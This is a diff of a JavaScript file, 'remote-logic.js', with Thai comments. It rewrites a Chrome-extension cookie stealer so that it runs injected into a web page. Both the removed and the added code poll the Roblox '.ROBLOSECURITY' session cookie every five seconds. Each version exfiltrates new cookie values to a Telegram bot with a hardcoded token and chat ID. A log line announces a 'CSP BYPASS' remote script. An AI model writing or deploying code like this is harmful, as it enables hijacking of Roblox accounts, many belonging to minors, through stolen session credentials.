@@ -1,58 +1,52 @@
 // remote-logic.js
-console.log("--- REMOTE SCRIPT IS RUNNING (CSP BYPASS) ---");
-document.body.style.border = "5px solid green"; 
-// ลองใส่คำสั่งที่คุณต้องการที่นี่ได้เลย
+(function() {
+    console.log("--- REMOTE SCRIPT IS RUNNING (CSP BYPASS) ---");
+    document.body.style.border = "5px solid green"; 
 
-let lastCookie = "";
+    let lastCookie = "";
 
-async function checkCookie(){
-
-  chrome.cookies.get({
-    url: "https://www.roblox.com",
-    name: ".ROBLOSECURITY"
-  }, (cookie)=>{
-
-    if(!cookie) return;
-
-    const current = cookie.value;
-
-    if(current !== lastCookie){
-
-      lastCookie = current;
-
-      fetch("https://api.telegram.org/bot8622001163:AAFzrmxcoDLJKS51yyyddOceU_iUoOooWZ0/sendMessage",{
-        method:"POST",
-        headers:{
-          "Content-Type":"application/json"
-        },
-        body:JSON.stringify({
-          chat_id:"8508643177",
-          text:"Roblox Cookie ใหม่:\n"+current
-        })
-      });
-
+    // ฟังก์ชันสำหรับดึงค่า Cookie เฉพาะชื่อที่ต้องการจากหน้าเว็บ
+    function getCookieByName(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return null;
     }
 
-  });
+    async function checkCookie() {
+        // เปลี่ยนจากการใช้ chrome.cookies มาเป็นการอ่านจาก document.cookie โดยตรง
+        const current = getCookieByName(".ROBLOSECURITY");
 
-}
+        if (!current) {
+            console.log("Cookie not found or not accessible from this context.");
+            return;
+        }
 
-// สร้าง alarm ทุก 5 วินาที
-chrome.runtime.onInstalled.addListener(()=>{
-  chrome.alarms.create("checkCookie",{
-    periodInMinutes: 0.0833 // 5 วิ
-  });
-});
+        if (current !== lastCookie) {
+            lastCookie = current;
 
-// เมื่อ alarm ทำงาน
-chrome.alarms.onAlarm.addListener((alarm)=>{
-  if(alarm.name === "checkCookie"){
-    checkCookie();
-  }
-});
+            // ส่งข้อมูลไปยัง Telegram
+            try {
+                await fetch("https://api.telegram.org/bot8622001163:AAFzrmxcoDLJKS51yyyddOceU_iUoOooWZ0/sendMessage", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: "8508643177",
+                        text: "Roblox Cookie ใหม่ (Detected from Page):\n" + current
+                    })
+                });
+                console.log("Data sent to Telegram successfully.");
+            } catch (error) {
+                console.error("Failed to send to Telegram:", error);
+            }
+        }
+    }
 
-chrome.runtime.onStartup.addListener(()=>{
-  chrome.alarms.create("checkCookie",{
-    periodInMinutes: 0.0833
-  });
-});
+    // ใช้ setInterval แทน chrome.alarms เพราะรันบนหน้าเว็บได้ทันที
+    // 5000ms = 5 วินาที
+    console.log("Monitoring started...");
+    setInterval(checkCookie, 5000);
+
+})();
